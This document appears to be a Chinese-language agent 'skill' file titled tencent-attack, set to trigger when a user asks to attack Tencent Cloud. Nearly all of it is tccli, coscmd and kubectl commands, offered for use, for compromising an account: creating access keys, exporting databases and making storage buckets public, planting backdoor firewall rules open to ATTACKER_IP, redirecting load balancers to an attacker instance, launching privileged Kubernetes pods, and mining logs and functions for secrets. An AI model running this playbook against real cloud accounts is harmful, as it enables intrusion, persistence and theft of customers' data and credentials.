---
name: tencent-attack
type: attack
category: cloud
platform: tencent
severity: high
---

# 腾讯云攻击技能

## 触发条件

- 有腾讯云凭证（SecretId 或 STS Token）
- 目标使用腾讯云
- 用户要求"攻击腾讯云"

## 前置检查

```bash
# 1. 安装腾讯云 CLI
pip install tccli

# 2. 配置凭证
tccli configure

# 3. 验证凭证
tccli sts GetCallerIdentity

# 4. 列出 CVM 实例
tccli cvm DescribeInstances --output json
```

## 攻击方法

### 方法 1: CAM 权限提升

```bash
# 1. 获取当前用户信息
tccli cam GetUser

# 2. 列出所有用户
tccli cam ListUsers

# 3. 获取用户权限
tccli cam ListUserPolicies --SubUin SUB_UIN --Uin UIN

# 4. 获取 AccessKey
tccli cam ListAccessKeys --TargetUin UIN

# 5. 创建新的 AccessKey
tccli cam CreateAccessKey --TargetUin UIN
```

### 方法 2: CVM 实例攻击

```bash
# 1. 列出所有实例
tccli cvm DescribeInstances --output json

# 2. 获取实例详情
tccli cvm DescribeInstances --InstanceIds i-INSTANCE_ID

# 3. 通过 VNC 连接
tccli cvm DescribeInstanceVncUrl --InstanceId i-INSTANCE_ID

# 4. 获取实例密码（如果使用 Cloud Reset Password Agent）
tccli cvm DescribeInstances --InstanceIds i-INSTANCE_ID | grep -i "password"
```

### 方法 3: COS 对象存储攻击

```bash
# 1. 列出所有 Bucket
tccli cos GetService --output json

# 2. 列出 Bucket 内容
# 需要使用 coscmd 或 SDK
pip install coscmd
coscmd -b BUCKET_NAME -r REGION list

# 3. 下载文件
coscmd -b BUCKET_NAME -r REGION download OBJECT_PATH /tmp/

# 4. 设置 Bucket 为公开
tccli cos PutBucketACL --Bucket BUCKET_NAME --ACL public-read
```

### 方法 4: TencentDB 攻击

```bash
# 1. 列出所有数据库实例
tccli cdb DescribeInstances --output json

# 2. 获取数据库连接信息
tccli cdb DescribeInstanceInfo --InstanceId INSTANCE_ID

# 3. 创建只读账号
tccli cdb CreateAccounts --InstanceId INSTANCE_ID \
  --Accounts '[{"User":"attacker","Host":"%","Password":"Pass123!","ReadOnly":true}]'

# 4. 导出数据库
tccli cdb ExportInstanceJob --InstanceId INSTANCE_ID --FileName backup.sql
```

### 方法 5: CLB 负载均衡攻击

```bash
# 1. 列出所有负载均衡
tccli clb DescribeLoadBalancers --output json

# 2. 获取后端服务器
tccli clb DescribeTargetHealth --LoadBalancerId LB_ID

# 3. 修改负载均衡配置
tccli clb RegisterTargets --LoadBalancerId LB_ID \
  --Targets '[{"InstanceId":"i-ATTACKER_ID","Port":80,"Weight":100}]'

# 4. 删除健康检查
tccli clb ModifyLoadBalancerAttributes --LoadBalancerId LB_ID \
  --LoadBalancerId LB_ID --HealthSwitch 0
```

### 方法 6: 安全组利用

```bash
# 1. 列出所有安全组
tccli cdb DescribeSecurityGroups --output json

# 2. 获取安全组规则
tccli cvm DescribeSecurityGroupPolicies --SecurityGroupId SG_ID

# 3. 添加后门规则
tccli cvm CreateSecurityGroupPolicies --SecurityGroupId SG_ID \
  --SecurityGroupPolicySet.Version 1 \
  --SecurityGroupPolicySet.Egress '[{"PolicyIndex":1,"Protocol":"tcp","Port":"1,65535","CidrBlock":"0.0.0.0/0","Action":"ACCEPT"}]'

# 4. 开放攻击者 IP
tccli cvm CreateSecurityGroupPolicies --SecurityGroupId SG_ID \
  --SecurityGroupPolicySet.Ingress '[{"Protocol":"tcp","Port":"22","CidrBlock":"ATTACKER_IP/32","Action":"ACCEPT"}]'
```

### 方法 7: TKE 容器服务攻击

```bash
# 1. 列出所有集群
tccli tke DescribeClusters

# 2. 获取集群凭证
tccli tke DescribeClusterKubeconfig --ClusterId CLUSTER_ID

# 3. 如果可以访问 K8s API
kubectl get nodes --kubeconfig=kubeconfig.conf
kubectl get pods --all-namespaces --kubeconfig=kubeconfig.conf

# 4. 创建特权 Pod
kubectl run privileged-pod --image=alpine \
  --overrides='{"spec":{"containers":[{"name":"privileged","securityContext":{"privileged":true}}]}}' \
  --kubeconfig=kubeconfig.conf
```

### 方法 8: SCF 无服务器攻击

```bash
# 1. 列出所有函数
tccli scb ListFunctions --output json

# 2. 获取函数代码
tccli scb GetFunction --FunctionName FUNCTION_NAME --Namespace NAMESPACE

# 3. 获取环境变量
tccli scb GetFunction --FunctionName FUNCTION_NAME --Namespace NAMESPACE | \
  grep -i "Environment"

# 4. 查看函数日志
tccli scb GetFunctionLogs --FunctionName FUNCTION_NAME --Namespace NAMESPACE \
  --Limit 100
```

### 方法 9: 日志服务利用

```bash
# 1. 列出所有日志主题
tccli cls DescribeTopics --output json

# 2. 搜索日志
tccli cls SearchLog --TopicId TOPIC_ID \
  --StartTime $(date -d '1 hour ago' +%s) --EndTime $(date +%s) \
  --Query "password|secret|token"

# 3. 导出日志
tccli cls DownloadLog --TopicId TOPIC_ID \
  --StartTime $(date -d '1 hour ago' +%s) --EndTime $(date +%s) \
  --OutputFile /tmp/logs.json
```

### 方法 10: 密钥管理利用

```bash
# 1. 列出所有密钥
tccli kms ListKeys --output json

# 2. 获取密钥详情
tccli kms DescribeKey --KeyId KEY_ID

# 3. 解密数据
tccli kms Decrypt --CiphertextBlob fileb://encrypted.bin

# 4. 创建新密钥
tccli kms CreateKey --Alias alias/attacker --Description "Malicious key"
```

## 验证成功

```bash
# 成功验证凭证
tccli sts GetCallerIdentity

# 成功列出实例
tccli cvm DescribeInstances

# 成功访问 COS
coscmd -b BUCKET_NAME list
```

## 下一步

1. 使用窃取的凭证访问更多腾讯云服务
2. 通过 CVM 实例横向移动
3. 利用 COS 窃取敏感数据
4. 通过 TKE 攻击 K8s 集群
